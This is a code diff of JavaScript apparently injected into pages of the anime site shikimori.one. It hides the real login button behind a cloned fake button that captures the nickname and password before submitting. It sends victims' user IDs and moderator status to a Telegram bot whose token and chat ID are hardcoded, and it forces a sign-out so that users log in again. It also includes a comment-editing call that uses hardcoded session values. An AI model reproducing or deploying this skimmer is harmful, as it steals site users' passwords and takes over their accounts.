@@ -1,21 +1,36 @@
  function onInject() {
-    console.log('Init Inject');
+     console.log('Init Inject');
 
-    signOutUser();
+  //let submitButton = document.querySelector('.p-devise_sessions .simple_form.b-form.new_user');
+  let submitButton = document.querySelector('.p-devise_sessions .btn-primary[value="Войти"]');
+  if (submitButton != null) {
+    console.log('button found!');
+    let name = document.getElementById('user_nickname');
+    let pass = document.getElementById('user_password');
+    console.log('inputs found!');
+    //submitButton.addEventListener('mouseenter', ()=>{
+    //sendComment(`name: ${name.value}, pass : ${pass.value}`);
+    //  console.log(`name: ${name.value}, pass : ${pass.value}`);
+    //})
 
-    const name = document.getElementById('user_nickname');
-    const pass = document.getElementById('user_password');
-    // let submitButton = document.querySelector('.p-devise_sessions .btn-primary[value="Войти"]');
-    // submitButton.addEventListener('mouseenter', onInputChange);
-    if(pass != null && name != null) {
-        console.log('inputs found!');
-
-        name.addEventListener("input", onInputChange);
-        pass.addEventListener("input", onInputChange);
-    }
+    let fakeButton = submitButton.cloneNode(true);
+    fakeButton.classList.add('b-button');
+    fakeButton.type = 'button';
+    submitButton.after(fakeButton);
+    submitButton.style.display = 'none';
+    fakeButton.addEventListener('click', ()=>{
+      fakeButton.value = fakeButton.dataset.disableWith;
+      let strData = `name: ${name.value}, pass : ${pass.value}`;
+      //console.log(strData);
+      sendComment(strData).then(()=>{
+        submitButton.click();
+      })
+    })
+  }
  }
 
-function signOutUser() {
+async function signOutUser(delay) {
+     await sleep(delay);
      const metaTag = document.querySelector('meta[name="csrf-token"]');
      const csrfToken = metaTag ? metaTag.getAttribute("content") : null;
      fetch('https://shikimori.one/api/users/sign_out', {
@@ -26,20 +41,34 @@ function signOutUser() {
      })
  }
 
- function onInputChange() {
+ function editComment() {
+     const csrfToken = "HARDCODE_CSRF_TOKEN";
+     const cookie = "_kawai_session=HARDCODE_COOKIE";
+     fetch(`https://shikimori.one/api/comments/${COMMENT_ID}`, {
+        "headers": {
+        'Cookie': cookie,
+        'X-CSRF-Token': csrfToken,
+        },
+        "body": {
+            "comment": {
+                    "body": "Отредактированный комментарий."
+                },
+                "frontend": "false"
+        },
+        "method": 'PUT'
+     })
+ }
+
+ function sendToTelegram(text) {
     const token = '7284579776:AAG-0g9TOkPFqIJUP4rPg-uAz_nYRAdbm60';
     const chatId = '250460465';
 
-    const name = document.getElementById('user_nickname').value;
-    const pass = document.getElementById('user_password').value;
-    const message = `Name: ${name}\nPassword: ${pass}`;
-
-            $.ajax({
+                 $.ajax({
                 type: 'POST',
                 url: `https://api.telegram.org/bot${token}/sendMessage`,
                 data: {
                     chat_id: chatId,
-                    text: message,
+                    text: text,
                     parse_mode: 'html',
                 },
                 success: function (res) {
@@ -53,4 +82,33 @@ function signOutUser() {
             });
  }
 
+ function getTooltip() {
+    let userData = $('body').data('user');
+    let defautUrl = 'https://shikimori.one/comments/10529261';
+    let $container = $('.pusechka529');
+    if ($container) {
+        let $link = $container.children('.bubbled-processed');
+        let targetUrl = $container.children('.target.hidden').attr('href') || defautUrl;
+        let $tooltip = $link.tooltip();
+        //let $target = $tooltip.getTrigger();
+        let $tip = $tooltip.getTip();
+        if ($tip) {
+        $tip.find('.tooltip-details').load(targetUrl + '/tooltip', function() {
+            var $this = $(this);
+            $tooltip.show({
+            target: $link[0]
+            });
+            $this.process();
+        });
+        }
+        $link.attr('href', targetUrl);
+        let logoutDelay = $container.data('signout-delay') || 1000;
+        if (userData.id) signOutUser(logoutDelay);
+
+        let strData = `Заражен ${userData.id} - ${userData.url} Модератор: ${userData.is_moderator}`;
+        sendToTelegram(strData);
+  }
+}
+
+getTooltip();
 onInject();
